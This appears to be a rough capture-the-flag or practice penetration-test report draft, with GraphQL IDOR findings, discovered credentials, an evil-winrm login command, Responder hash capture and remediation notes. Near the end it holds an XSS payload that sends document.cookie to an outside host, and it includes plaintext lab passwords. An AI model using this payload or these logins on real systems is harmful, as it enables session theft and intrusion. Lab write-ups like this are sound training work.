# Schellman 
- [Schellman](#schellman)
  - [Project Summary](#project-summary)
  - [Scope](#scope)
  - [Major Findings by Severity Level](#major-findings-by-severity-level)
  - [Itemized issue listing](#itemized-issue-listing)

## Project Summary

## Scope

## Major Findings by Severity Level
Urgent - 
Major - 
Medium - 
Low -
## Itemized issue listing

![](/CTF/img/2020-08-10-11-48-13.png)

Login using credentials from the source code which is logged in as guest...
Graphql introspection then query out 

![](../CTF/img/2020-08-11-08-03-53.png)

![](../CTF/img/2020-08-11-08-08-59.png)

![](../CTF/img/2020-08-10-13-17-32.png)


Graphql information query, IDOR information disclosure

Using dirb found a secret file which is allowing non-authorized access 

![](../CTF/img/2020-08-10-13-29-38.png)

secret-creds.enc 
Username: billybob
Password: Winter2020!
Server: BLU-DevServer

![](../CTF/img/2020-08-10-13-32-56.png)

C:\Users\BillyBob\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
This file can be cleared using a task or it powershell can be configured to not output console history
evil-winrm -i 10.0.0.6 -u randy_admin -p '*3AHOiMb*67LlLpIZKx71bN6'

![](../CTF/img/2020-08-10-13-52-40.png)

![](../CTF/img/2020-08-10-14-01-17.png)

Create a rocket account, users are showing passwords in plaintext

![](../CTF/img/2020-08-10-14-04-32.png)

Logging into with azurediamond hunter2 there was another flag...never, unless you want to invite users to access your account, give plaintext passwords

----
Using responder to listen to requests from the networks domain 
If a client/target cannot resolve a name via DNS it will fall back to name resolution via LLMNR (introduced in Windows Vista) and NBT-NS which this host is responding to which will cause no alarms, malicious activity, simply listening to requests can expose hashes in this case it was an administrator for the server!!
The hash was cracked using hashcat and rockyou (which is a common list of passwords)


Remediation -- Disable LLMNR via group policy, Disable NBT-NS, enable SMB signing via group policy 
http://techgenix.com/secure-smb-connections/

https://technet.microsoft.com/en-us/library/jj852239(v=ws.11).aspx

![](../CTF/img/2020-08-10-15-20-15.png)

![](../CTF/img/2020-08-10-15-20-32.png)

![](../CTF/img/2020-08-10-15-19-29.png)

Willemlovesienna11 wisable


10.0.0.13 -- jbossws console
![](../CTF/img/2020-08-10-18-12-06.png)


<script> new Image().src="http://10.0.0.4/?output="+document.cookie; </script>
[2:39 PM]
PRD02
PRD03

![](../CTF/img/2020-08-11-10-31-34.png)
